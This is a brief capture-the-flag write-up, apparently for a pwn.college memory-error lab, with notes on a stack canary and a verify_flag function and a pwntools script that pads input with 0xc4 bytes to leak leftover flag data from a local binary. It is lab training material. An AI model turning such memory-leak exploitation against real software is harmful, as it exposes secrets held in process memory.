![](./Lingering%20Leftover-1780487207721.webp)
the output is limited, just before the canary, so we are not leaking anything
![](./Lingering%20Leftover-1780487272009.webp)
looking in main, we see a pretty suspicious function (verify_flag)
![](./Lingering%20Leftover-1780487313852.webp)
seems like it read the flag into memory

```
#!/usr/bin/python3
from pwn import *
import re
import sys
import time

context.log_level="debug"

##while True:
p=process("/home/thtad/Desktop/pwncollege/mem_error/lingering-leftover/lingering-leftover-hard")

payload=b"A"*(0xc4)

p.recvuntil("Payload size:")
p.sendline(str(0xc4).encode())
p.recvuntil("bytes)!")
p.send(payload)

p.interactive()
```